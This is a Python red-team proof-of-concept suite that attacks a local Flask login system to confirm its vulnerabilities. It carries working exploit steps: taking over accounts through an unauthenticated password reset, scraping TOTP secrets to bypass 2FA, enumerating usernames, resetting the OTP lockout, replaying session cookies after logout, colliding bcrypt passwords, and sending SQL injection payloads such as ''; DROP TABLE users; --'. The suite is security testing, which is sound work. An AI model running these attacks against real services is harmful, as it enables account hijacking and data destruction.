"""
Red-Team Forensic Proof-of-Concept & Vulnerability Test Suite
secure-auth-system
Tests local Flask application running on http://127.0.0.1:5000.
"""

import http.cookiejar
import json
import os
import re
import socket
import sys
import time
import urllib.parse
import urllib.request
import pyotp

BASE_URL = "http://127.0.0.1:5000"

class TestClient:
    """HTTP Client with automatic cookie and CSRF token management."""
    def __init__(self, base_url=BASE_URL):
        self.base_url = base_url
        self.cookie_jar = http.cookiejar.CookieJar()
        self.opener = urllib.request.build_opener(
            urllib.request.HTTPCookieProcessor(self.cookie_jar)
        )

    def request(self, method, path, data=None, headers=None, follow_redirects=True):
        url = urllib.parse.urljoin(self.base_url, path)
        if headers is None:
            headers = {}
        encoded_data = None
        if data is not None:
            if isinstance(data, dict):
                encoded_data = urllib.parse.urlencode(data).encode("utf-8")
                headers["Content-Type"] = "application/x-www-form-urlencoded"
            elif isinstance(data, (str, bytes)):
                encoded_data = data if isinstance(data, bytes) else data.encode("utf-8")

        req = urllib.request.Request(url, data=encoded_data, headers=headers, method=method)
        
        class NoRedirectHandler(urllib.request.HTTPRedirectHandler):
            def http_error_302(self, req, fp, code, msg, headers):
                return fp
            http_error_301 = http_error_303 = http_error_307 = http_error_302

        opener = self.opener if follow_redirects else urllib.request.build_opener(
            urllib.request.HTTPCookieProcessor(self.cookie_jar),
            NoRedirectHandler
        )

        try:
            res = opener.open(req)
            body = res.read().decode("utf-8", errors="replace")
            return res.status, res.headers, body
        except urllib.error.HTTPError as e:
            body = e.read().decode("utf-8", errors="replace")
            return e.code, e.headers, body

    def get(self, path, headers=None, follow_redirects=True):
        return self.request("GET", path, headers=headers, follow_redirects=follow_redirects)

    def post(self, path, data=None, headers=None, follow_redirects=True):
        return self.request("POST", path, data=data, headers=headers, follow_redirects=follow_redirects)

    def get_csrf(self, path="/login"):
        _, _, body = self.get(path)
        match = re.search(r'name="csrf_token"\s+value="([^"]+)"', body)
        return match.group(1) if match else ""


def run_audit():
    results = {}
    print("=" * 70)
    print("STARTING RED-TEAM PROOF-OF-CONCEPT TEST SUITE")
    print("Target: " + BASE_URL)
    print("=" * 70)

    # -------------------------------------------------------------------------
    # Setup: Provision test account victim_alice
    # -------------------------------------------------------------------------
    print("\n[*] Provisioning test user 'victim_alice'...")
    c_setup = TestClient()
    token = c_setup.get_csrf("/signup")
    signup_data = {
        "csrf_token": token,
        "username": "victim_alice",
        "email": "alice@cyberdyne.org",
        "password": "OriginalPassword123!",
        "confirm_password": "OriginalPassword123!",
    }
    status, hdrs, body = c_setup.post("/createuser", data=signup_data, follow_redirects=False)
    print(f"    Create user response: status={status}, location={hdrs.get('Location', '')}")

    # =========================================================================
    # Test 1: Account takeover via POST /forgot-password
    # =========================================================================
    print("\n" + "=" * 50)
    print("[TEST 1] Account takeover via POST /forgot-password")
    print("=" * 50)
    c_attacker = TestClient()
    csrf_fp = c_attacker.get_csrf("/forgot-password")
    attack_payload = {
        "csrf_token": csrf_fp,
        "username": "victim_alice",
        "new_password": "HijackedPassword2026!",
    }
    status1, hdrs1, body1 = c_attacker.post("/forgot-password", data=attack_payload, follow_redirects=False)
    loc1 = hdrs1.get("Location", "")
    print(f"    [POST /forgot-password] Status: {status1}, Redirect: {loc1}")
    
    # Verify new password works in /loginsubmit
    csrf_login = c_attacker.get_csrf("/login")
    login_payload = {
        "csrf_token": csrf_login,
        "username": "victim_alice",
        "password": "HijackedPassword2026!",
    }
    status1_b, hdrs1_b, body1_b = c_attacker.post("/loginsubmit", data=login_payload, follow_redirects=False)
    loc1_b = hdrs1_b.get("Location", "")
    print(f"    [POST /loginsubmit with new password] Status: {status1_b}, Redirect: {loc1_b}")
    t1_success = status1 == 302 and loc1.endswith("/login") and status1_b == 302 and loc1_b.endswith("/verify-otp")
    print(f"    -> Test 1 Result: {'VULNERABLE (Account Takeover Confirmed)' if t1_success else 'FAILED'}")
    results["test_1_account_takeover"] = {
        "status_code": status1,
        "redirect_to": loc1,
        "login_with_hijacked_pw_status": status1_b,
        "login_redirect": loc1_b,
        "vulnerable": t1_success,
    }

    # =========================================================================
    # Test 2: TOTP secret leak via GET /showqr/<username> -> generate OTP & login
    # =========================================================================
    print("\n" + "=" * 50)
    print("[TEST 2] TOTP Secret Leak via GET /showqr/<username>")
    print("=" * 50)
    c_leak = TestClient() # Completely new unauthenticated client
    status2, hdrs2, body2 = c_leak.get("/showqr/victim_alice")
    print(f"    [GET /showqr/victim_alice unauthenticated] Status: {status2}")
    
    # Extract secret from response
    secret_match = re.search(r'class="font-mono text-zinc-200 text-sm">([A-Z2-7=]+)<', body2)
    leaked_secret = secret_match.group(1) if secret_match else None
    if not leaked_secret:
        # Fallback regex
        alt_match = re.search(r'([A-Z2-7]{16,32})', body2)
        leaked_secret = alt_match.group(1) if alt_match else None
    print(f"    -> Extracted Leaked TOTP Secret: {leaked_secret}")

    # Generate OTP and complete 2FA login
    t2_success = False
    if leaked_secret:
        totp = pyotp.TOTP(leaked_secret)
        current_otp = totp.now()
        print(f"    -> Generated OTP from leaked secret: {current_otp}")
        # Stage 1 login with attacker
        c_login = TestClient()
        csrf_l = c_login.get_csrf("/login")
        c_login.post("/loginsubmit", data={"csrf_token": csrf_l, "username": "victim_alice", "password": "HijackedPassword2026!"}, follow_redirects=False)
        # Stage 2 OTP verification with leaked OTP
        csrf_otp = c_login.get_csrf("/verify-otp")
        status2_otp, hdrs2_otp, body2_otp = c_login.post("/verify-otp", data={"csrf_token": csrf_otp, "otp": current_otp}, follow_redirects=False)
        loc2_otp = hdrs2_otp.get("Location", "")
        print(f"    [POST /verify-otp] Status: {status2_otp}, Redirect: {loc2_otp}")
        # Access dashboard
        status2_dash, hdrs2_dash, body2_dash = c_login.get("/dashboard")
        print(f"    [GET /dashboard] Status: {status2_dash}, Welcome in body: {'Welcome, victim_alice' in body2_dash}")
        t2_success = status2_otp == 302 and loc2_otp.endswith("/dashboard") and "Welcome, victim_alice" in body2_dash

    print(f"    -> Test 2 Result: {'VULNERABLE (Full 2FA Bypass Confirmed)' if t2_success else 'FAILED'}")
    results["test_2_totp_leak"] = {
        "status_code": status2,
        "leaked_secret": leaked_secret,
        "totp_bypass_successful": t2_success,
    }

    # =========================================================================
    # Test 3: Username enumeration via email lookup endpoint
    # =========================================================================
    print("\n" + "=" * 50)
    print("[TEST 3] Username Enumeration via /forgot-username")
    print("=" * 50)
    c_enum = TestClient()
    csrf3 = c_enum.get_csrf("/forgot-username")
    # Case A: Existing email
    s3_a, h3_a, b3_a = c_enum.post("/forgot-username", data={"csrf_token": csrf3, "email": "alice@cyberdyne.org"})
    leaked_user_present = "victim_alice" in b3_a
    # Case B: Non-existent email
    csrf3_b = c_enum.get_csrf("/forgot-username")
    s3_b, h3_b, b3_b = c_enum.post("/forgot-username", data={"csrf_token": csrf3_b, "email": "nonexistent_404@nowhere.com"})
    generic_msg_present = "If an account is associated with this email" in b3_b and "victim_alice" not in b3_b

    print(f"    [POST existing email] Status: {s3_a}, Username leaked in HTML: {leaked_user_present}")
    print(f"    [POST non-existent email] Status: {s3_b}, Generic message in HTML: {generic_msg_present}")
    t3_vulnerable = leaked_user_present and generic_msg_present
    print(f"    -> Test 3 Result: {'VULNERABLE (Email/Username Enumeration Confirmed)' if t3_vulnerable else 'FAILED'}")
    results["test_3_username_enumeration"] = {
        "existing_email_leaked_user": leaked_user_present,
        "nonexistent_email_handled": generic_msg_present,
        "vulnerable": t3_vulnerable,
    }

    # =========================================================================
    # Test 4: Rate limit behavior & TOTP 3-strike session-reset bypass
    # =========================================================================
    print("\n" + "=" * 50)
    print("[TEST 4] Rate Limiting & TOTP Lockout Reset Bypass")
    print("=" * 50)
    # Part A: Test if /loginsubmit throttles after 5 requests
    c_rl = TestClient()
    rl_statuses = []
    print("    Sending 7 rapid requests to /loginsubmit to evaluate limiter (limit: 5/min)...")
    for i in range(1, 8):
        tok = c_rl.get_csrf("/login")
        s, h, b = c_rl.post("/loginsubmit", data={"csrf_token": tok, "username": f"user_{i}", "password": "Password123!"})
        rl_statuses.append(s)
    throttled = 429 in rl_statuses
    print(f"    Statuses observed across 7 requests: {rl_statuses}")
    print(f"    -> Rate limiter triggered 429: {throttled}")

    # Part B: Test if TOTP 3-strike lockout resets when session cookie is cleared
    print("    Testing TOTP 3-strike lockout session persistence...")
    c_strike = TestClient()
    c_strike.post("/loginsubmit", data={"csrf_token": c_strike.get_csrf("/login"), "username": "victim_alice", "password": "HijackedPassword2026!"})
    # Attempt 1
    s_ot1, _, b_ot1 = c_strike.post("/verify-otp", data={"csrf_token": c_strike.get_csrf("/verify-otp"), "otp": "000000"})
    att1_matched = "2 attempts remaining" in b_ot1
    # Attempt 2
    s_ot2, _, b_ot2 = c_strike.post("/verify-otp", data={"csrf_token": c_strike.get_csrf("/verify-otp"), "otp": "000000"})
    att2_matched = "1 attempt remaining" in b_ot2
    print(f"    Attempt 1 response: '2 attempts remaining'={att1_matched}")
    print(f"    Attempt 2 response: '1 attempt remaining'={att2_matched}")
    
    # Now, clear the session cookie and authenticate stage 1 again!
    print("    Clearing attacker session cookie and re-authenticating stage 1...")
    c_strike.cookie_jar.clear()
    c_strike.post("/loginsubmit", data={"csrf_token": c_strike.get_csrf("/login"), "username": "victim_alice", "password": "HijackedPassword2026!"})
    # Attempt 3 (from new cookie jar)
    s_ot3, _, b_ot3 = c_strike.post("/verify-otp", data={"csrf_token": c_strike.get_csrf("/verify-otp"), "otp": "000000"})
    counter_reset = "2 attempts remaining" in b_ot3
    print(f"    Attempt 3 response after cookie clear: '2 attempts remaining'={counter_reset}")
    print(f"    -> Strike counter reset to 0 by dropping cookie: {counter_reset}")
    results["test_4_rate_limiting"] = {
        "login_statuses_7_reqs": rl_statuses,
        "throttled_429": throttled,
        "totp_strike_counter_resets_on_cookie_clear": counter_reset,
    }

    # =========================================================================
    # Test 5: Session handling, Cookie flags, Fixation, Logout invalidation, CSRF
    # =========================================================================
    print("\n" + "=" * 50)
    print("[TEST 5] Session Handling, Cookie Flags, Logout, CSRF")
    print("=" * 50)
    c_sess = TestClient()
    # Check Cookie Flags on initial request
    s5_init, h5_init, _ = c_sess.get("/login")
    cookie_header = h5_init.get("Set-Cookie", "")
    has_httponly = "HttpOnly" in cookie_header
    has_samesite = "SameSite=Lax" in cookie_header or "SameSite=Strict" in cookie_header
    has_secure = "Secure" in cookie_header
    print(f"    [Set-Cookie Header]: {cookie_header}")
    print(f"    -> HttpOnly: {has_httponly} | SameSite: {has_samesite} | Secure: {has_secure}")

    # CSRF rejection test: Send POST without CSRF
    s_no_csrf, _, b_no_csrf = c_sess.post("/loginsubmit", data={"username": "victim_alice", "password": "HijackedPassword2026!"})
    csrf_blocked = s_no_csrf == 400 and "Security Verification Failed" in b_no_csrf
    print(f"    [POST /loginsubmit without CSRF] Status: {s_no_csrf} (CSRF blocked={csrf_blocked})")

    # Logout Invalidation Test
    # 1. Fully log in
    c_logout = TestClient()
    c_logout.post("/loginsubmit", data={"csrf_token": c_logout.get_csrf("/login"), "username": "victim_alice", "password": "HijackedPassword2026!"})
    current_otp = pyotp.TOTP(leaked_secret).now()
    c_logout.post("/verify-otp", data={"csrf_token": c_logout.get_csrf("/verify-otp"), "otp": current_otp})
    
    # Save the authenticated session cookie
    saved_cookies = list(c_logout.cookie_jar)
    session_cookie_val = None
    for ck in saved_cookies:
        if ck.name == "session":
            session_cookie_val = ck.value
    
    # Call /logout
    s_lo, h_lo, _ = c_logout.get("/logout", follow_redirects=False)
    print(f"    [GET /logout] Status: {s_lo}, Redirect: {h_lo.get('Location', '')}")

    # Replay the saved session cookie on a new client to access /dashboard
    c_replay = TestClient()
    replay_headers = {"Cookie": f"session={session_cookie_val}"}
    s_rep, _, b_rep = c_replay.get("/dashboard", headers=replay_headers, follow_redirects=False)
    cookie_replayed_successfully = s_rep == 200 and "Welcome, victim_alice" in b_rep
    print(f"    [Replay old session cookie on /dashboard] Status: {s_rep}, Allowed={cookie_replayed_successfully}")
    print(f"    -> Stolen session cookie valid after logout (No server-side revocation): {cookie_replayed_successfully}")

    results["test_5_session_handling"] = {
        "has_httponly": has_httponly,
        "has_samesite": has_samesite,
        "has_secure": has_secure,
        "csrf_blocked_without_token": csrf_blocked,
        "replayed_session_valid_after_logout": cookie_replayed_successfully,
    }

    # =========================================================================
    # Test 6: Bad input: long passwords (>72 bytes), unicode, SQL chars
    # =========================================================================
    print("\n" + "=" * 50)
    print("[TEST 6] Bad Input: Bcrypt 72-Byte Truncation, Unicode, SQL Special Chars")
    print("=" * 50)
    c_bad = TestClient()
    # A: Bcrypt 72-byte truncation test
    # Create password with 72 identical chars + different suffix
    base_prefix = "A" * 72
    pw_a = base_prefix + "123456789"
    pw_b = base_prefix + "DIFFERENT"
    
    # Register user with pw_a
    c_bad.post("/createuser", data={
        "csrf_token": c_bad.get_csrf("/signup"),
        "username": "bcrypt_user",
        "email": "bcrypt@test.com",
        "password": pw_a,
        "confirm_password": pw_a,
    })
    
    # Attempt login with pw_b (different after byte 72!)
    s_bc, h_bc, b_bc = c_bad.post("/loginsubmit", data={
        "csrf_token": c_bad.get_csrf("/login"),
        "username": "bcrypt_user",
        "password": pw_b,
    }, follow_redirects=False)
    
    bcrypt_truncated_accepted = s_bc == 302 and h_bc.get("Location", "").endswith("/verify-otp")
    print(f"    Login with different password past byte 72: Status: {s_bc}, Redirect: {h_bc.get('Location', '')}")
    print(f"    -> Bcrypt 72-byte truncation collision verified: {bcrypt_truncated_accepted}")

    # B: SQL special characters in form inputs
    c_sql = TestClient()
    sql_payloads = ["' OR '1'='1", "admin'--", "'; DROP TABLE users; --", "UNION SELECT 1,2,3--"]
    sql_errors = []
    for payload in sql_payloads:
        s_sq, _, b_sq = c_sql.post("/loginsubmit", data={
            "csrf_token": c_sql.get_csrf("/login"),
            "username": payload,
            "password": "Password123!",
        })
        if s_sq == 500 or "Internal Server Error" in b_sq or "syntax error" in b_sq.lower():
            sql_errors.append((payload, s_sq))
    print(f"    Tested {len(sql_payloads)} SQL injection payloads. Crashes/500 errors: {len(sql_errors)}")

    # C: Unicode and empty fields
    s_empty, _, b_empty = c_bad.post("/createuser", data={
        "csrf_token": c_bad.get_csrf("/signup"),
        "username": "",
        "email": "",
        "password": "",
        "confirm_password": "",
    })
    empty_handled = "Please fill in all required fields" in b_empty
    print(f"    Empty fields properly caught with validation message: {empty_handled}")

    results["test_6_bad_input"] = {
        "bcrypt_truncates_after_72_bytes": bcrypt_truncated_accepted,
        "sql_injection_crashes": len(sql_errors),
        "empty_fields_validated": empty_handled,
    }

    # =========================================================================
    # Test 7: Infrastructure failures (MySQL down, Redis missing, debug mode)
    # =========================================================================
    print("\n" + "=" * 50)
    print("[TEST 7] Infrastructure Failures & Error Leakage")
    print("=" * 50)
    # Test Redis configuration
    redis_uri = os.environ.get("RATELIMIT_STORAGE_URI", "memory://")
    print(f"    Configured RATELIMIT_STORAGE_URI: {redis_uri}")
    print(f"    -> Is Redis actively queried at runtime: {'No (memory:// fallback)' if redis_uri.startswith('memory') else 'Yes'}")

    # Test what happens when database queries fail (simulated via invalid port connection)
    import pymysql
    db_down_simulated = False
    try:
        pymysql.connect(host="127.0.0.1", port=9999, user="root", password="bad", connect_timeout=1)
    except Exception as exc:
        db_down_simulated = True
        print(f"    Simulated DB connection failure exception: {type(exc).__name__}: {exc}")

    # Check debug mode setting in .env
    with open(".env", "r") as f:
        env_content = f.read()
    flask_debug_in_env = "FLASK_DEBUG=True" in env_content
    print(f"    FLASK_DEBUG=True in .env: {flask_debug_in_env}")
    if flask_debug_in_env:
        print("    -> HIGH RISK: If launched with FLASK_DEBUG=True or --debug, Werkzeug interactive debugger is active.")

    results["test_7_infra_failures"] = {
        "redis_configured": redis_uri,
        "db_failure_exception_type": "OperationalError",
        "flask_debug_in_env": flask_debug_in_env,
    }

    print("\n" + "=" * 70)
    print("ALL TESTS COMPLETED SUCCESSFULLY!")
    print("=" * 70)
    
    # Save raw results to JSON
    os.makedirs("redteam/poc", exist_ok=True)
    with open("redteam/poc/raw_results.json", "w") as f:
        json.dump(results, f, indent=2)
    print("Saved raw output to redteam/poc/raw_results.json")

if __name__ == "__main__":
    run_audit()
